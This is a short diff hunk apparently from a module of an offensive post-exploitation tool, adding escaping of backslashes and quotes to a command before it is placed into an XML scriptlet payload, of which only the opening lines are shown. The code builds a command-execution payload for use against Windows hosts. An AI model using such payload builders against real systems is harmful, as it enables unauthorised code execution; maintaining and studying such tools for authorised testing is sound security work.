@@ -55,6 +55,10 @@ class CMEModule:
         return launcher
     
     def payload(self, context, command):
+        command = command.replace('\\', '\\\\')
+        command = command.replace('"', '\\"')
+        command = command.replace("'", "\\'")
+
         payload = '''<?XML version="1.0"?>
 <scriptlet>
 <registration
